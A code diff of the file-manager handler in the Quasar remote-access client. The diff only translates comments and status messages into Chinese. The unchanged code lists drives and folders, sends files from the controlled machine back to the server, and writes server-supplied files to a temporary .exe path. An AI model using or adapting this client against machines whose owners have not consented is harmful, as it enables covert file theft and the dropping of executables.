@@ -1,4 +1,4 @@
-﻿using Quasar.Client.Networking;
+﻿﻿﻿﻿using Quasar.Client.Networking;
 using Quasar.Common;
 using Quasar.Common.Enums;
 using Quasar.Common.Extensions;
@@ -19,7 +19,7 @@ namespace Quasar.Client.Messages
     public class FileManagerHandler : NotificationMessageProcessor, IDisposable
     {
         private readonly ConcurrentDictionary<int, FileSplit> _activeTransfers = new ConcurrentDictionary<int, FileSplit>();
-        private readonly Semaphore _limitThreads = new Semaphore(2, 2); // maximum simultaneous file downloads
+        private readonly Semaphore _limitThreads = new Semaphore(2, 2); // 最大同时文件下载数
 
         private readonly QuasarClient _client;
 
@@ -46,7 +46,7 @@ namespace Quasar.Client.Messages
                     _token = _tokenSource.Token;
                     break;
                 case false:
-                    // cancel all running transfers on disconnect
+                    // 在断开连接时取消所有正在运行的传输
                     _tokenSource.Cancel();
                     break;
             }
@@ -99,18 +99,18 @@ namespace Quasar.Client.Messages
             }
             catch (IOException)
             {
-                client.Send(new SetStatusFileManager { Message = "GetDrives I/O error", SetLastDirectorySeen = false });
+                client.Send(new SetStatusFileManager { Message = "获取驱动器 I/O 错误", SetLastDirectorySeen = false });
                 return;
             }
             catch (UnauthorizedAccessException)
             {
-                client.Send(new SetStatusFileManager { Message = "GetDrives No permission", SetLastDirectorySeen = false });
+                client.Send(new SetStatusFileManager { Message = "获取驱动器 无权限", SetLastDirectorySeen = false });
                 return;
             }
 
             if (driveInfos.Length == 0)
             {
-                client.Send(new SetStatusFileManager { Message = "GetDrives No drives", SetLastDirectorySeen = false });
+                client.Send(new SetStatusFileManager { Message = "获取驱动器 无驱动器", SetLastDirectorySeen = false });
                 return;
             }
 
@@ -186,31 +186,31 @@ namespace Quasar.Client.Messages
             }
             catch (UnauthorizedAccessException)
             {
-                onError("GetDirectory No permission");
+                onError("获取目录 无权限");
             }
             catch (SecurityException)
             {
-                onError("GetDirectory No permission");
+                onError("获取目录 无权限");
             }
             catch (PathTooLongException)
             {
-                onError("GetDirectory Path too long");
+                onError("获取目录 路径过长");
             }
             catch (DirectoryNotFoundException)
             {
-                onError("GetDirectory Directory not found");
+                onError("获取目录 目录未找到");
             }
             catch (FileNotFoundException)
             {
-                onError("GetDirectory File not found");
+                onError("获取目录 文件未找到");
             }
             catch (IOException)
             {
-                onError("GetDirectory I/O error");
+                onError("获取目录 I/O 错误");
             }
             catch (Exception)
             {
-                onError("GetDirectory Failed");
+                onError("获取目录 失败");
             }
             finally
             {
@@ -229,13 +229,13 @@ namespace Quasar.Client.Messages
                     using (var srcFile = new FileSplit(message.RemotePath, FileAccess.Read))
                     {
                         _activeTransfers[message.Id] = srcFile;
-                        OnReport("File upload started");
+                        OnReport("文件上传已开始");
                         foreach (var chunk in srcFile)
                         {
                             if (_token.IsCancellationRequested || !_activeTransfers.ContainsKey(message.Id))
                                 break;
 
-                            // blocking sending might not be required, needs further testing
+                            // 阻塞发送可能不是必需的，需要进一步测试
                             _client.SendBlocking(new FileTransferChunk
                             {
                                 Id = message.Id,
@@ -257,7 +257,7 @@ namespace Quasar.Client.Messages
                     client.Send(new FileTransferCancel
                     {
                         Id = message.Id,
-                        Reason = "Error reading file"
+                        Reason = "读取文件错误"
                     });
                 }
                 finally
@@ -276,7 +276,7 @@ namespace Quasar.Client.Messages
                 client.Send(new FileTransferCancel
                 {
                     Id = message.Id,
-                    Reason = "Canceled"
+                    Reason = "已取消"
                 });
             }
         }
@@ -291,18 +291,18 @@ namespace Quasar.Client.Messages
 
                     if (string.IsNullOrEmpty(filePath))
                     {
-                        // generate new temporary file path if empty
+                        // 如果为空则生成新的临时文件路径
                         filePath = FileHelper.GetTempFilePath(".exe");
                     }
 
                     if (File.Exists(filePath))
                     {
-                        // delete existing file
+                        // 删除现有文件
                         NativeMethods.DeleteFile(filePath);
                     }
 
                     _activeTransfers[message.Id] = new FileSplit(filePath, FileAccess.Write);
-                    OnReport("File download started");
+                    OnReport("文件下载已开始");
                 }
 
                 if (!_activeTransfers.ContainsKey(message.Id))
@@ -327,7 +327,7 @@ namespace Quasar.Client.Messages
                 client.Send(new FileTransferCancel
                 {
                     Id = message.Id,
-                    Reason = "Error writing file"
+                    Reason = "写入文件错误"
                 });
             }
         }
